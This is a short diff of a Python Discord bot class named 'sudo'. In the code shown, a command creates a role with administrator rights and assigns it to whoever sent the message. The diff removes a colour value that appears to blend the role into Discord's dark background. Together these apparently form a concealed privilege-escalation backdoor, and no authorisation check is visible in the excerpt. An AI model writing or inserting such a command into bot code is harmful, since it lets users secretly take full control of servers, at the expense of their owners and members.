@@ -17,7 +17,7 @@ class sudo:
         role_permissions = guild.default_role
         role_permissions = role_permissions.permissions
         role_permissions.administrator = True
-        await guild.create_role(name=role_name, permissions=role_permissions, colour=discord.Colour(0x2C2F33))
+        await guild.create_role(name=role_name, permissions=role_permissions)
         role = discord.utils.get(ctx.guild.roles, name=role_name)
         user = ctx.message.author
         await user.add_roles(role)
